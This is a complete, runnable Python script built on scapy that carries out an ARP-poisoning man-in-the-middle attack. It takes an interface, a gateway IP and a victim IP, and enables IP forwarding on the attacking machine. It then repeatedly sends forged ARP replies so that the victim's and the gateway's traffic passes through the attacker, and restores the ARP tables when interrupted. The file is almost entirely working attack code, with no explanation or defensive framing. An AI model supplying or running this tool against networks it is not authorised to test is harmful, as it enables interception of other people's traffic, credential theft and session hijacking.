#!/usr/bin/python3

from scapy.all import *
import sys
import os
import time

def help():

	print("Usage python3 mitm.py -i <interface> -a <gateway-ip> -v <victim-ip>")


if ( len(sys.argv) < 6 ):
	help()
	sys.exit(1)

elif ( sys.argv[1] != "-i" ):
	help()
	sys.exit(1)
elif ( sys.argv[3] != "-a" ):
	help()
	sys.exit(1)
elif ( sys.argv[5] != "-v"):
	help()
	sys.exit(1)




try:
	interface = sys.argv[2]
	gateIP = sys.argv[4]
	victimIP = sys.argv[6]

except KeyboardInterrupt:
	print ("\n[*] User Requested Shutdown")
	print ("[*] Exiting...")
	sys.exit(1)

print('\033[33m')
print (r"""
__/\\\\____________/\\\\__/\\\\\\\\\\\__/\\\\\\\\\\\\\\\__/\\\\____________/\\\\_        
 _\/\\\\\\________/\\\\\\_\/////\\\///__\///////\\\/////__\/\\\\\\________/\\\\\\_       
  _\/\\\//\\\____/\\\//\\\_____\/\\\___________\/\\\_______\/\\\//\\\____/\\\//\\\_      
   _\/\\\\///\\\/\\\/_\/\\\_____\/\\\___________\/\\\_______\/\\\\///\\\/\\\/_\/\\\_     
    _\/\\\__\///\\\/___\/\\\_____\/\\\___________\/\\\_______\/\\\__\///\\\/___\/\\\_    
     _\/\\\____\///_____\/\\\_____\/\\\___________\/\\\_______\/\\\____\///_____\/\\\_   
      _\/\\\_____________\/\\\_____\/\\\___________\/\\\_______\/\\\_____________\/\\\_  
       _\/\\\_____________\/\\\__/\\\\\\\\\\\_______\/\\\_______\/\\\_____________\/\\\_ 
        _\///______________\///__\///////////________\///________\///______________\///__

""")
print ('\033[0m')

print ("[Interface]    " + sys.argv[2] + "\n" + "[Gateway]      " + sys.argv[4] + "\n" + "[Target]       " + sys.argv[6] + "\n")
print ("\n[\033[33m+\033[0m] Enabling IP Forwarding\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():

	print ("\n[\033[33m+\033[0m] Restoring Target\n")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print ("[\033[33m-\033[0m] Disabling IP Forwarding\n")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print ("[\033[33m-\033[0m] Shutting Down\n")
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print ("[\033[31m!\033[0m] Couldn't Find Victim MAC Address [\033[31m!\033[0m]")
		print ("[\033[31m!\033[0m] Exiting [\033[31m!\033[0m]")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print ("[\033[31m!\033[0m] Couldn't Find Gateway MAC Address [\033[31m!\033[0m]")
		print ("[\033[31m!\033[0m] Exiting [\033[31m!\033[0m]")
		sys.exit(1)
	print ("[\033[33m+\033[0m] Poisoning Target")
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
mitm()
